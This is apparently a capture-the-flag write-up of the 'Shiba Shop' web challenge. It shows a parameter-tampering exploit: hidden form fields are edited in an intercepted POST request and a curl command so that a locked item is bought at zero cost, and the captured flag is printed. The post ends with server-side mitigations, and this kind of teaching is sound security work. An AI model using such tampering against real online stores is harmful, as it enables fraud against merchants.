# Shiba Shop


> **Welcome to the Shiba Shop! Choose your favorite companion. Some special items might require deep pockets... or a clever bypass.**

{{< admonition tldr "TL;DR" >}}
**Shiba Shop** is a web security challenge that demonstrates the dangers of client-side trust and missing server-side validation. By intercepting the HTTP POST purchase request with Burp Suite and tampering with the hidden form parameters (`item_id=5430&cost=0`), an attacker can acquire the locked high-cost FLAG item without having sufficient wallet balance.
{{< /admonition >}}

## Challenge Overview

The application simulates a pet shop where users can purchase different varieties of Shiba Inu using their wallet balance.

Browsing the catalog reveals several items:

| Item Name | Item ID | Listed Cost | Status |
| :--- | :--- | :--- | :--- |
| Black Shiba | `5427` | 4,096 | Available |
| Red Shiba | `5428` | 4,096 | Available |
| White Shiba | `5429` | 4,096 | Available |
| **FLAG** | `5430` | 999,999,999 | Disabled |
| Evil Shiba | `5431` | 4,096 | Available |
| Null Shiba | `5432` | 4,096 | Available |

{.table-responsive}

The **FLAG** item is deliberately locked:
1. The price is exorbitantly higher than the user's initial wallet balance (`65,536`).
2. The HTML purchase button has the `disabled` attribute set.

---

## Technical Analysis

Inspecting the purchase mechanism in the HTML source code shows that selecting an item submits an HTTP POST request to `/buy`:

```html
<form method="POST" action="/buy">
  <input type="hidden" name="item_id" value="5429" />
  <input type="hidden" name="cost" value="4096" />
  <input type="hidden" name="wallet" value="65536" />
  <button type="submit">Buy</button>
</form>
```

The application exposes three critical state variables directly through client-controlled form fields:

- `item_id`: The database identifier of the requested item.
- `cost`: The price to be deducted from the user's funds.
- `wallet`: The user's current balance.

### Vulnerability Identification

The application places absolute trust in the client to provide authoritative pricing and wallet state:

> **Unvalidated Client-Side State / Parameter Tampering**

The server does not query its own internal database to confirm the price of `item_id`, nor does it maintain wallet state within an authenticated session. Instead, it blindly processes the numbers submitted in the request body.

---

## Exploitation

### 1. Intercepting the Request

Using **Burp Suite** or browser developer tools, we click to buy any available item (such as `White Shiba`) and intercept the outgoing POST request:

```http
POST /buy HTTP/1.1
Host: chall.nckuctf.org:28101
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

item_id=5429&cost=4096&wallet=65536
```

### 2. Modifying Parameters

We alter the request parameters to target the FLAG item while zeroing out the cost:

- Change `item_id` from `5429` to `5430` (the FLAG item).
- Change `cost` from `4096` to `0` (bypassing balance deductions).
- Keep `wallet=65536` to satisfy any non-negative balance checks.

The manipulated request:

```http
POST /buy HTTP/1.1
Host: chall.nckuctf.org:28101
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

item_id=5430&cost=0&wallet=65536
```

We can execute this request via `curl`:

```bash
curl -X POST https://chall.nckuctf.org:28101/buy \
  -d "item_id=5430&cost=0&wallet=65536"
```

### 3. Response & Flag Capture

The backend server processes the manipulated parameters without objection, deducting `0` from the balance and rendering the FLAG:

```text
Congratulations! You purchased the secret Shiba:
NCKUCTF{B3w4r3_0f_th3_5h1b4owo}
```

---

## Flag

```text
NCKUCTF{B3w4r3_0f_th3_5h1b4owo}
```

---

## Mitigation & Remediation

1. **Enforce Server-Side Truth:** The price of an item must always be retrieved from a trusted server-side database using the `item_id`, never from incoming HTTP parameters.
2. **Session-Bound Balances:** The user's wallet balance must be stored in server-side session state or the database. The client should never have the ability to supply or modify their own balance.
3. **Strict Parameter Whitelisting:** Disallow client submission of administrative fields such as `cost` or `wallet`.


---

> Author: [spawn2pwn](https://github.com/nfl-alvis)  
> URL: https://ctf.spawn2pwn.my.id/posts/shiba-shop/  

